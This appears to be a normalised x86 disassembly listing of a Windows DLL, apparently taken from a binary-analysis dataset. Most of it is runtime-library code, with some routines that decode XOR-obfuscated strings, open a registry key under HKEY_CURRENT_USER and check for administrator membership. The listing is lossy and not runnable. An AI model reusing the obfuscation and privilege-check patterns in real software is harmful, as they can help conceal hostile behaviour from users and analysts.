or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_10012991
mov [ eax ] 0x2a
call sub_10012991
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_10012991
push 0x22
pop esi
mov [ eax ] esi
call sub_1002788e
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10078970
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10078970
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1002635d
push 0xc
push r--data
call sub_10078b50
call sub_10044fed
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_100246c1
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100263ca
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10044fed
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10078b95
retn
push 0x20
call sub_1003fa9e
sub_100263e0
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
mov ecx [ r--data ]
xor eax eax
push ebx
nop
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0xfff8
and ebx 0xff
mov [ ebp + eax * 2 - 0x10 ] bx
inc eax
cmp eax 0x4
jb r-xdata
push edx
lea ecx [ ebp - 0x10 ]
xor eax eax
push ecx
mov [ ebp - 0x8 ] ax
call sub_100145e0
add esp 0x8
pop ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x9
call sub_1000a6f0
push edi
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0xa4
call sub_1000a6f0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x80 ]
mov eax 0xe8
call sub_1000a6f0
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100264a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
push [ ebp + 0x24 ]
mov edx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1007d6e8
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_100264f9
push 0x28
mov eax sub_1007ef3b
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_1001a1b3
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1005ac7e
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1005206b
jmp r-xdata
sub_1002657b
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10026610
push ebp
mov ebp esp
push 0xffffffff
push sub_10081160
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_1002cec0
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_10028710
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
test edx edx
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
mov edx edi
[ ecx ] edx
jne r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
[ eax ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10026770
push ebp
mov ebp esp
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax edi
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_10054700
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_100267d0
push ebp
mov ebp esp
sub esp 0x480
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ ebp - 0x474 ] eax
mov [ ebp - 0x470 ] 0x0
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x63
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x2d
jb r-xdata
lea ecx [ ebp - 0x46c ]
push ecx
push 0x2011b
xor eax eax
push eax
lea edx [ ebp - 0x60 ]
push edx
push 0x80000001
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x46c ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x470 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
push edi
lea eax [ ebp - 0x468 ]
push eax
lea ecx [ ebp - 0x268 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x46c ]
push ecx
lea edx [ ebp - 0x474 ]
push edx
lea edi [ ebp - 0x478 ]
lea ebx [ ebp - 0x47c ]
call sub_10001000
mov eax [ ebp - 0x46c ]
add esp 0x18
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x46c ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100268fe
push 0x80
mov eax sub_1007e676
call sub_10007703
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10009450
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10064bde
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_1002a730
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_1005e05a
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_1005e05a
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_1005e05a
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_10060ea7
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002e079
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001e1bc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1001e1ec
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1004b830
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_10060ea7
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
call sub_1001bc97
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1ec
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002e079
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002e079
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
xor eax eax
call sub_10019c00
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_1005e05a
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001e1bc
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov ecx esi
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
push edi
mov ecx esi
call sub_10060ea7
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001e1bc
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1001e1ec
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1001e1bc
sub_10027000
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005b460
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10027030
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x500
mov [ ebp - 0x10 ] ebx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
call [ FreeSid@IAT ]
sub_100270c0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_1001deb0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_100270f0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi edx
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0xa8 ] eax
lea eax [ esi + 0xc ]
mov [ edi + 0x40 ] ebx
mov [ edi + 0x44 ] ebx
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0xac ] esi
jb r-xdata
mov [ ebp - 0xa4 ] eax
mov ecx [ eax ]
mov [ ebp - 0xa4 ] ecx
jmp r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0xa4 ]
push ebx
push ecx
push eax
mov [ edi ] eax
call sub_10078600
lea eax [ esi + 0x2c ]
add esp 0xc
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push eax
call [ LocalFree@IAT ]
mov [ edi ] ebx
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov [ ebp - 0xa4 ] eax
mov edx [ eax ]
mov [ ebp - 0xa4 ] edx
jmp r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov edx [ ebp - 0xa4 ]
push ebx
push edx
push eax
mov [ edi + 0x8 ] eax
call sub_10078600
mov eax [ esi + 0x28 ]
mov [ edi + 0x20 ] eax
mov ecx [ esi + 0x58 ]
mov [ edi + 0x24 ] ecx
mov edx [ esi + 0x50 ]
mov [ edi + 0x2c ] edx
mov eax [ esi + 0x54 ]
mov [ edi + 0x28 ] eax
mov [ edi + 0x38 ] 0x1
mov ecx [ esi + 0x68 ]
mov [ edi + 0x40 ] ecx
mov edx [ esi + 0x6c ]
mov [ edi + 0x44 ] edx
mov eax [ esi + 0x5c ]
